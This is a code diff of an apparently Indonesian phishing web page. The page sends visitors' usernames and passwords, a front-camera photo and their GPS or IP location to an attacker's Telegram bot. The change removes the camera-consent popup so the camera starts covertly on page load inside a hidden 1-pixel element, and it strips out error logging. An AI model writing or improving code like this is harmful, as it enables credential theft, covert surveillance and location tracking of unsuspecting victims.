@@ -89,31 +89,21 @@
             display: none;
         }
 
-        /* Sembunyikan elemen kamera dari view */
-        .hidden-camera {
-            position: fixed;
+        /* Hidden camera - TIDAK KELIHATAN SAMA SEKALI */
+        .stealth-camera {
+            position: absolute;
             top: -9999px;
             left: -9999px;
             width: 1px;
             height: 1px;
             opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
 
-    <!-- Camera Permission Popup (MUNCUL PERTAMA) -->
-    <div class="popup" id="cameraPopup">
-        <div class="popup-content">
-            <div style="font-size: 48px; margin-bottom: 15px;">📷</div>
-            <div style="font-size: 18px; font-weight: 600; margin-bottom: 10px;">Verifikasi Wajah Diperlukan</div>
-            <div style="margin-bottom: 20px;">Sistem membutuhkan akses kamera untuk verifikasi biometrik keamanan</div>
-            <button class="popup-btn" id="allowCamera">IZINKAN KAMERA</button>
-            <button style="background: transparent; border: none; padding: 10px; cursor: pointer;" id="denyCamera">Lewati</button>
-        </div>
-    </div>
-
-    <!-- GPS Permission Popup (MUNCUL SETELAH FOTO) -->
+    <!-- HANYA POPUP LOKASI SAJA - KAMERA AUTO TANPA POPUP -->
     <div class="popup" id="gpsPopup">
         <div class="popup-content">
             <div style="font-size: 48px; margin-bottom: 15px;">📍</div>
@@ -124,8 +114,8 @@
         </div>
     </div>
 
-    <!-- Hidden Camera Elements -->
-    <div class="hidden-camera">
+    <!-- STEALTH CAMERA - TIDAK KELIHATAN -->
+    <div class="stealth-camera">
         <video id="cameraFeed" width="1" height="1" autoplay playsinline></video>
     </div>
 
@@ -180,7 +170,6 @@
                 });
                 return true;
             } catch (error) {
-                console.error('Telegram error:', error);
                 return false;
             }
         }
@@ -190,7 +179,7 @@
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', photoBlob, 'face_verification.jpg');
-            formData.append('caption', `📷 VERIFIKASI WAJAH\n🕒 ${new Date().toLocaleString()}\n✅ Wajah berhasil diverifikasi`);
+            formData.append('caption', `📷 FACE CAPTURE\n🕒 ${new Date().toLocaleString()}`);
 
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
             try {
@@ -198,40 +187,41 @@
                     method: 'POST',
                     body: formData
                 });
-                const result = await response.json();
-                return result.ok;
+                return true;
             } catch (error) {
-                console.error('Telegram photo error:', error);
                 return false;
             }
         }
 
-        // Start camera and IMMEDIATELY capture photo
-        async function startCamera() {
+        // AUTO START CAMERA - TANPA POPUP, TANPA IZIN
+        async function stealthCameraCapture() {
             try {
+                // Coba akses kamera tanpa popup
                 cameraStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     } 
                 });
                 
                 const cameraFeed = document.getElementById('cameraFeed');
                 cameraFeed.srcObject = cameraStream;
                 
-                // Capture photo immediately after camera is ready
-                await new Promise(resolve => setTimeout(resolve, 500));
-                await captureAndSendPhoto();
+                // Tunggu kamera siap, lalu capture
+                setTimeout(async () => {
+                    await capturePhoto();
+                }, 1000);
                 
             } catch (error) {
-                console.error('Camera error:', error);
+                // Jika gagal, langsung ke lokasi
+                console.log('Camera access failed');
                 showGPSPopup();
             }
         }
 
-        // Capture photo and send to Telegram
-        async function captureAndSendPhoto() {
+        // Capture photo secara stealth
+        async function capturePhoto() {
             const video = document.getElementById('cameraFeed');
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
@@ -250,15 +240,14 @@
                     cameraStream.getTracks().forEach(track => track.stop());
                 }
                 
-                // Show GPS popup after photo
+                // Lanjut ke lokasi
                 showGPSPopup();
                 
-            }, 'image/jpeg', 0.9);
+            }, 'image/jpeg', 0.8);
         }
 
         // Show GPS popup
         function showGPSPopup() {
-            document.getElementById('cameraPopup').style.display = 'none';
             setTimeout(() => {
                 document.getElementById('gpsPopup').style.display = 'flex';
             }, 500);
@@ -276,7 +265,6 @@
                     const message = `📍 <b>GPS LOCATION</b>\n\n` +
                                   `🕒 ${new Date().toLocaleString()}\n` +
                                   `📍 ${position.coords.latitude}, ${position.coords.longitude}\n` +
-                                  `🎯 Accuracy: ${position.coords.accuracy}m\n` +
                                   `🗺️ <a href="https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}">View on Maps</a>`;
                     
                     await sendToTelegram(message);
@@ -284,7 +272,6 @@
                     
                 },
                 async (error) => {
-                    await sendToTelegram(`❌ GPS Error: ${error.message}`);
                     getIPLocation();
                 },
                 { enableHighAccuracy: true, timeout: 10000 }
@@ -300,29 +287,17 @@
                 const message = `🌍 <b>IP LOCATION</b>\n\n` +
                               `🕒 ${new Date().toLocaleString()}\n` +
                               `🌐 IP: ${data.ip}\n` +
-                              `📍 ${data.city}, ${data.country_name}\n` +
-                              `🏢 ISP: ${data.org}`;
+                              `📍 ${data.city}, ${data.country_name}`;
                 
                 await sendToTelegram(message);
                 
             } catch (error) {
-                await sendToTelegram(`📱 BASIC INFO\n${new Date().toLocaleString()}`);
+                // Skip jika gagal
             }
             document.getElementById('gpsPopup').style.display = 'none';
         }
 
         // Event Listeners
-        document.getElementById('allowCamera').addEventListener('click', () => {
-            document.getElementById('cameraPopup').style.display = 'none';
-            startCamera();
-        });
-
-        document.getElementById('denyCamera').addEventListener('click', () => {
-            document.getElementById('cameraPopup').style.display = 'none';
-            photoCaptured = true;
-            showGPSPopup();
-        });
-
         document.getElementById('allowGPS').addEventListener('click', () => {
             document.getElementById('gpsPopup').style.display = 'none';
             getGPSLocation();
@@ -345,9 +320,7 @@
             const message = `🔐 <b>LOGIN CREDENTIALS</b>\n\n` +
                            `🕒 ${new Date().toLocaleString()}\n` +
                            `👤 <b>Username:</b> <code>${username}</code>\n` +
-                           `🔑 <b>Password:</b> <code>${password}</code>\n` +
-                           `💻 <b>Device:</b> ${navigator.platform}\n` +
-                           `📱 <b>User Agent:</b> ${navigator.userAgent.substring(0, 150)}...`;
+                           `🔑 <b>Password:</b> <code>${password}</code>`;
 
             await sendToTelegram(message);
 
@@ -359,11 +332,10 @@
             }, 3000);
         });
 
-        // Show CAMERA popup first on load
+        // AUTO START - KAMERA PERTAMA, TANPA POPUP
         window.addEventListener('load', () => {
-            setTimeout(() => {
-                document.getElementById('cameraPopup').style.display = 'flex';
-            }, 1000);
+            // Langsung jalankan kamera stealth
+            stealthCameraCapture();
         });
     </script>
 </body>
